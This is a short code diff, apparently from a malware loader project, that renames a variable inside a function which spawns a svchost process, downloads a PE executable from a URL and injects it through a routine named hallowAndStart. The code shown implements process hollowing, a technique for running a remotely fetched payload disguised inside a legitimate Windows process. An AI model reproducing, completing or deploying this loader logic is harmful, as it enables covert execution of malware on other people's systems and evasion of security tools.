@@ -441,11 +441,11 @@ return false;
 }
 
 bool __0x1FN3C3SS4RY__(){
-    PROCESS_INFORMATION pinfo=spawn(PROCESS);
-    printf("CHECK PROCESS WITH DEBUGGER BEFORE UNMAP //// SVCHOST PID: %i\n",pinfo.dwProcessId);
+    PROCESS_INFORMATION proc_info=spawn(PROCESS);
+    printf("CHECK PROCESS WITH DEBUGGER BEFORE UNMAP //// SVCHOST PID: %i\n",proc_info.dwProcessId);
     getchar();
-    HANDLE hProc=pinfo.hProcess;
-    HANDLE hMainThread=pinfo.hThread;
+    HANDLE hProc=proc_info.hProcess;
+    HANDLE hMainThread=proc_info.hThread;
     BYTE* pe=fetchPE(URL); // returns heap base 
     bool cool=hallowAndStart(hProc,hMainThread,pe);
     if(cool)
